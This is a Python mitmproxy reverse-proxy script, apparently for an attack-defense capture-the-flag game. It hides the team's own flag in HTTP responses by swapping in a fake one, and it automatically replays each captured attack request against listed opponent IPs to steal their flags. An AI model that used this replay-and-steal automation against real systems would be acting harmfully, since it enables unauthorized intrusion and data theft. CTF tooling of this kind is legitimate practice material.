from mitmproxy import proxy, options
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.script import concurrent
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from random import choice
from string import digits, ascii_letters
from threading import Timer
from re import search
from urllib3 import PoolManager

# urllib3 pool manager for http sessions
http 		 = PoolManager()

# timeout to wait for http request when attacking
TIMEOUT 	 = 3

# list of victims to attack back
VICTIMS_IPS	 = [('172.17.0.4', 80), ('172.17.0.5', 80)]

# customizable with preferred charset and repetition to increase probability
CHARSET 	 = ascii_letters + digits + 3*'_' + 2*'_' + 2*'$'

# flag pattern and repl to substitute the flag with in the http response
PATTERN 	 = None
REPL 	 	 = None

# service type http/https
SERVICE_TYPE = 'http'

# stolen flags per victim
STOLEN_FLAGS = {}

#Function to perform the request to a victim (replay the attack)
def performRequest(victim, method, path, headers, body):
	# It would be easier forwarding the raw packet through raw socket
	# but they are not efficient and optimized, thus a simple GET
	# would take more than 3 seconds to send-receive
	to_print = f"Replay attack to victim {victim} => " 
	try:
		headers['Host'] = victim[0]
		url = f'{SERVICE_TYPE}://{victim[0]}:{victim[1]}{path}'
		res = http.request(method, url, headers=headers, body=body, timeout=TIMEOUT)
		# check if we got the flag from the attack
		match = search(PATTERN, res.data)
		if match:
			stolen_flag = match.group(0).decode()
			# check if this victim record is present
			if victim in STOLEN_FLAGS : 
				# check if this flag was already taken from this victim
				if stolen_flag in STOLEN_FLAGS[victim]: to_print += 'already stolen'
				else: 
					STOLEN_FLAGS[victim].append(stolen_flag)
					to_print += stolen_flag
			else : 
				STOLEN_FLAGS[victim] = [stolen_flag]
				to_print += stolen_flag
		else: to_print += "did not worked"
	except:
		to_print += "did not worked"
	print(f'{to_print}\n\tStolen flags so far: {len(STOLEN_FLAGS)}')


#Addon to filter the flag in http responses
class FlagProtector:
	def __init__(self):
		self.attempt = 0
		self.success = 0
	
	# Function to handle HTTP responses. Each function call is performed in a separated thread thanks to the decorator
	@concurrent
	def response(self, flow):
		global REPL

		self.attempt += 1
		match = search(PATTERN, flow.response.content)
		# check if response contains our flag
		if match:
			self.success += 1

			# creating a random flag just the 1st time using the real flag length
			if REPL is None: REPL = match[0].replace(match[1], ''.join(choice(CHARSET) for i in range(len(match[1]))).encode())

			flow.response.content = flow.response.content.replace(match[0], REPL)
			print('-------------------------- Attack Detected --------------------------\n'
				f'From {flow.client_conn.address[0]}:{flow.client_conn.address[1]}\n\n'
				f'>>>>>>>>>>Request\n{flow.request.method} {flow.request.path} {flow.request.http_version}\n{bytes(flow.request.headers).decode()}\n'
				f'>>>>>>>>>>Answer\n{bytes(flow.response.headers).decode()}\n{flow.response.content.decode()}\n\n'
				f'Total attempts: {self.attempt}\n'
				f'Dangerous attempts defended: {self.success}\n'
				f'Right flag: {match[0].decode()}\n'
				f'Fake  flag: {REPL.decode()}\n')
			# for each victim in the game spawn a thread to replay the attack
			for victim in VICTIMS_IPS:
				t = Timer(0, performRequest, (victim, flow.request.method, flow.request.path, flow.request.headers, flow.request.content,))
				t.daemon = True
				t.start()


# main function to set parameters and start proxy
def main():
	global PATTERN, REPL, SERVICE_TYPE

	args = parseArguments()

	reverse_address = args['reverse-address']
	address 		= args['address']
	port 			= args['port']
	PATTERN			= args['pattern'].encode()

	if 'https' in reverse_address: SERVICE_TYPE = 'https'

	# creating proxy with options and loading addon to filter the flag
	opts = options.Options(mode=f'reverse:{reverse_address}', listen_host=address, listen_port=port)
	opts.add_option("body_size_limit", int, 0, "Byte size limit of HTTP request and response bodies. Understands k/m/g suffixes, i.e. 3m for 3 megabytes.")
	opts.add_option("keep_host_header", bool, False, "Reverse Proxy: Keep the original host header instead of rewriting it to the reverse proxy target.")
	m = DumpMaster(None)
	m.server = proxy.server.ProxyServer(proxy.config.ProxyConfig(opts))
	m.addons.add(FlagProtector())

	try:
		m.run()
	except KeyboardInterrupt:
		m.shutdown()


# function to define parameters to accept
def parseArguments():
    parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument('reverse-address', help='reserve service address ("http[s]://host[:port]")', type=str)
    parser.add_argument('pattern', help='the pattern to search for in the http body', type=str)
    parser.add_argument('-a', '--address', help='address to bind proxy to', type=str, default='')
    parser.add_argument('-p', '--port', help='proxy service port', type=int, default=8080)
    return parser.parse_args().__dict__


if __name__ == '__main__':
    main()